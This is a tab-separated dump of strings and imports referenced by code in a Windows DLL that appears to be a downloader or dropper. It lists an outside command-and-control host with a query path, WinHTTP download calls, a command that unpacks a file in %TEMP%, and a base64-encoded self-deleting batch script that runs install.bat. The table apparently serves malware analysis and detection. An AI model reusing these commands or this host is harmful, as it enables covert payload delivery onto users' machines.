reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1000101b	0x1000cf20	string	0x10001000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x10001020	0x100018d0	string	0x10001000	3\nD$\bS
0x10001025	0x1000cf20	string	0x10001000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x10001036	0x100018d0	string	0x10001000	3\nD$\bS
0x1000103b	0x1000cf20	string	0x10001000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x1000104c	0x100018d0	string	0x10001000	3\nD$\bS
0x10001051	0x1000cf20	string	0x10001000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x10001061	0x100018d0	string	0x10001000	3\nD$\bS
0x10001069	0x1000cf20	string	0x10001000	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
0x10001198	0x1000a9e0	string	0x100010e0	Wow64EnableWow64FsRedirection
0x1000119d	0x1000aa00	string	0x100010e0	kernel32.dll
0x100011a2	0x10009004	import	0x100010e0	KERNEL32.dll.GetModuleHandleW
0x100011a9	0x10009000	import	0x100010e0	KERNEL32.dll.GetProcAddress
0x100011c5	0x1000aa1c	string	0x100010e0	%TEMP%
0x100011ca	0x10009008	import	0x100010e0	KERNEL32.dll.ExpandEnvironmentStringsW
0x100011d0	0x1000900c	import	0x100010e0	KERNEL32.dll.GetTempFileNameW
0x100011ea	0x10009010	import	0x100010e0	KERNEL32.dll.DeleteFileW
0x10001222	0x10009014	import	0x100010e0	KERNEL32.dll.GetSystemWow64DirectoryW
0x1000122f	0x1000aa30	string	0x100010e0	/index.php?user_id=45678&type=%d
0x100012ba	0x1000aab0	string	0x100010e0	cmd /c expand "%s" -F:* "%s" && del /f /q "%s" && echo OK > a.log
0x1000133e	0x10009018	import	0x100010e0	KERNEL32.dll.CreateProcessW
0x1000134d	0x1000901c	import	0x100010e0	KERNEL32.dll.WaitForSingleObject
0x1000135a	0x10009020	import	0x100010e0	KERNEL32.dll.CloseHandle
0x100013d7	0x1000aa1c	string	0x10001380	%TEMP%
0x100013e6	0x10009008	import	0x10001380	KERNEL32.dll.ExpandEnvironmentStringsW
0x100013ec	0x1000ab34	string	0x10001380	\temp.bat
0x10001402	0x1000ce60	string	0x10001380	QGVjaG8gb2ZmDQoNCmNkIC9kICVURU1QJQ0KOldBSVRJTkcNCnRpbWVvdXQgL3QgMQ0KaWYgbm90IGV4aXN0ICJhLmxvZyIgKGdvdG8gV0FJVElORykNCmRlbCAvZiAvcSAiYS5sb2ciDQppbnN0YWxsLmJhdA0KZGVsIC9mIC9xICIlfmRwbngwIg==
0x1000141c	0x1000142f	string	0x10001380	WVj@
0x10001433	0x10009024	import	0x10001380	KERNEL32.dll.LocalAlloc
0x1000145b	0x1000ce60	string	0x10001380	QGVjaG8gb2ZmDQoNCmNkIC9kICVURU1QJQ0KOldBSVRJTkcNCnRpbWVvdXQgL3QgMQ0KaWYgbm90IGV4aXN0ICJhLmxvZyIgKGdvdG8gV0FJVElORykNCmRlbCAvZiAvcSAiYS5sb2ciDQppbnN0YWxsLmJhdA0KZGVsIC9mIC9xICIlfmRwbngwIg==
0x10001495	0x10009028	import	0x10001380	KERNEL32.dll.CreateFileW
0x100014b2	0x1000902c	import	0x10001380	KERNEL32.dll.WriteFile
0x100014b9	0x10009020	import	0x10001380	KERNEL32.dll.CloseHandle
0x100014cb	0x1000ab48	string	0x10001380	%windir%
0x100014d0	0x10009030	import	0x10001380	KERNEL32.dll.ExpandEnvironmentStringsA
0x100014dc	0x1000ab54	string	0x10001380	\sysnative
0x100014ef	0x1000ab60	string	0x10001380	\system32
0x10001508	0x1000ab6c	string	0x10001380	\cmd.exe /c cd /d "%TEMP%" && temp.bat
0x1000152a	0x10009034	import	0x10001380	KERNEL32.dll.WinExec
0x10001531	0x10009038	import	0x10001380	KERNEL32.dll.LocalFree
0x10001571	0x10009028	import	0x10001550	KERNEL32.dll.CreateFileW
0x10001589	0x1000903c	import	0x10001550	KERNEL32.dll.GetFileSize
0x10001593	0x1000159b	string	0x10001550	WSj@
0x1000159f	0x10009024	import	0x10001550	KERNEL32.dll.LocalAlloc
0x100015c0	0x10009040	import	0x10001550	KERNEL32.dll.ReadFile
0x100015c7	0x10009020	import	0x10001550	KERNEL32.dll.CloseHandle
0x100015d9	0x10009024	import	0x10001550	KERNEL32.dll.LocalAlloc
0x10001616	0x10009028	import	0x10001550	KERNEL32.dll.CreateFileW
0x10001637	0x1000902c	import	0x10001550	KERNEL32.dll.WriteFile
0x1000163e	0x10009020	import	0x10001550	KERNEL32.dll.CloseHandle
0x10001645	0x10009038	import	0x10001550	KERNEL32.dll.LocalFree
0x10001654	0x10009010	import	0x10001550	KERNEL32.dll.DeleteFileW
0x1000168e	0x10009048	import	0x10001680	KERNEL32.dll.SetUnhandledExceptionFilter
0x10001699	0x10009044	import	0x10001680	KERNEL32.dll.SetErrorMode
0x100016ae	0x1000904c	import	0x10001680	KERNEL32.dll.CreateThread
0x100016db	0x10009154	import	0x100016c0	WINHTTP.dll.WinHttpOpen
0x100016e8	0x100016f2	string	0x100016c0	WSSht
0x100016f5	0x1000aa74	string	0x100016c0	victory-2020.atwebpages.com
0x100016fb	0x10009150	import	0x100016c0	WINHTTP.dll.WinHttpConnect
0x1000170b	0x1000914c	import	0x100016c0	WINHTTP.dll.WinHttpCloseHandle
0x1000172b	0x10009148	import	0x100016c0	WINHTTP.dll.WinHttpOpenRequest
0x10001735	0x1000174f	string	0x100016c0	SSSSSSV
0x10001737	0x1000914c	import	0x100016c0	WINHTTP.dll.WinHttpCloseHandle
0x10001756	0x10009144	import	0x100016c0	WINHTTP.dll.WinHttpSendRequest
0x10001763	0x10009140	import	0x100016c0	WINHTTP.dll.WinHttpReceiveResponse
0x1000176e	0x1000914c	import	0x100016c0	WINHTTP.dll.WinHttpCloseHandle
0x1000178d	0x1000913c	import	0x100016c0	WINHTTP.dll.WinHttpQueryDataAvailable
